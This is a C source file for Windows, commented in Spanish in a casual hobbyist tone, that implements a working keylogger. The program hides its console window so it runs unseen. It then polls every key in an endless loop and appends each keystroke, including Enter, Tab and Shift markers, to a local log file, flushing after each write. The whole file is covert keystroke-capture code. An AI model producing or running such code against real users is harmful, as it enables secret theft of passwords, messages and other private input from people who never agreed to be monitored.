#include <windows.h>// libreria de windows
#include <stdio.h> //libreria base, para entrada  y  salida

// esta función oculta la ventana de la consola al ejecutar el programa
void ocultar_ventana() {
    HWND hWnd = GetConsoleWindow();      // obtiene el handle (identificador) de la ventana de la consola (para mostrarla u ocultarla)
    ShowWindow(hWnd, SW_HIDE);           // SW_HIDE oculta la ventana
}

int main() { //funcion principal del programita (por eso dice main jeje)
    ocultar_ventana();  // oculta la consola al iniciar el programa

    FILE *log = fopen("logs/keylog.txt", "a+");  // abre o crea el txt de log
    if (!log) {
        return 1;  // si no se puede abrir, salimos
    }

    while (1) { //bucle infinito para registrar las teclas
        Sleep(10);  // pausa el programa por 10ms para evitar que la cpu explote XD

        for (int key = 8; key <= 255; key++) { // este bucle for intenta recorrer todas las teclas posibles
            SHORT estado = GetAsyncKeyState(key); // lo hace desde el 8 pq desde ahi empiezan las teclas utiles, de 0 a 7 no se suelen usar

            // si la tecla fue presionada desde la última llamada
            if (estado & 0x0001) { //  0x0001 es una mascara de bits que verifica si el bit de presionado esta activo

                if (key == VK_RETURN)
                    fprintf(log, "[ENTER]"); // cada uno  de  estos printf con log escriben en el archivo log.txt lo q se presione
                else if (key == VK_SPACE)
                    fprintf(log, " ");
                else if (key == VK_BACK)
                    fprintf(log, "[BACK]");
                else if (key == VK_TAB)
                    fprintf(log, "[TAB]");
                else if (key == VK_SHIFT)
                    fprintf(log, "[SHIFT]");
                else if (key == VK_CONTROL)
                    fprintf(log, "[CTRL]");
                else if (key == VK_ESCAPE)
                    fprintf(log, "[ESC]");
                else if (key >= 32 && key <= 126)
                    fprintf(log, "%c", key);  // letras, números, símbolos

                fflush(log);  // asegura que los datos se escriban en disco inmediatamente, forzando que lo que esta en la memoria se escriiba
                //asi, si el programa se cierra de la nada, no se pierde lo registrado jeje
            }
        }
    }

    fclose(log);
    return 0;
}
